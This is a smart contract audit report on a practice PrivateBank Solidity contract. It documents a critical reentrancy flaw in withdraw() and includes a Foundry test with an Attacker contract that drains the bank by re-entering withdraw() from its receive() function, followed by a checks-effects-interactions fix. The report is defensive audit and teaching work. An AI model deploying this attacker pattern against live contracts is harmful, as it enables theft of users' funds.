
# Smart Contract Audit Report

## Audit Details

- **Auditor:** César Escribano (https://github.com/ceseshi)
- **Client:** Vottun
- **Date:** 3-May-2024
- **Description:** Security review of the PrivateBank smart contract, an Activity for the Vottun Journey
- **Audit Type:** Manual
- **Languages:** Solidity
- **Scope:** PrivateBank.sol

## Findings

### [H-1] Reentrancy in withdraw()

#### Severity

Critical

#### Description

It is possible to drain the funds of the PrivateBank contract through a re-entrancy attack.

To do this, an attacker contract can deposit an amount of ether and then withdraw it. Upon entering the attacker's fallback() function, the balance of his account in the PrivateBank will not yet have been reset to zero, so the attacker can call withdraw() again, repeating the operation until the PrivateBank contract is drained.

#### PoC (Froundry)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/PrivateBank.sol";

contract PrivateBankTest is Test {
    PrivateBank bank;
    Attacker attacker;

    function setUp() public {
        // Prepare contracts
        bank = new PrivateBank();
        attacker = new Attacker(bank);

        // Prepare addresses
        address alice = makeAddr("alice");
        address bob = makeAddr("bob");
        address carol = makeAddr("carol");

        vm.deal(alice, 1 ether);
        vm.deal(bob, 3 ether);
        vm.deal(carol, 5 ether);

        // Fund the PrivateBank
        vm.prank(bob);
        bank.deposit{value: bob.balance}();

        vm.prank(carol);
        bank.deposit{value: carol.balance}();
    }

    function testReentrancy() public {
        address alice = makeAddr("alice");
        vm.prank(alice);

        // Perform the attack
        uint256 amountAttack = alice.balance;
        attacker.attack{value: amountAttack}();

        // Check that the attacker has more than they started with
        assert(address(attacker).balance > amountAttack);
    }
}

contract Attacker {
    PrivateBank bank;

    constructor(PrivateBank _bank) {
        bank = _bank;
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= msg.value) {
            bank.withdraw();
        }
    }
}
```
#### Recommendations

Must follow the checks-effects-interactions pattern.

For this, the account balance must be modified prior to withdrawal (lines 17 to 20):

```solidity
    balances[msg.sender] = 0;
    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Failed to send Ether");
```

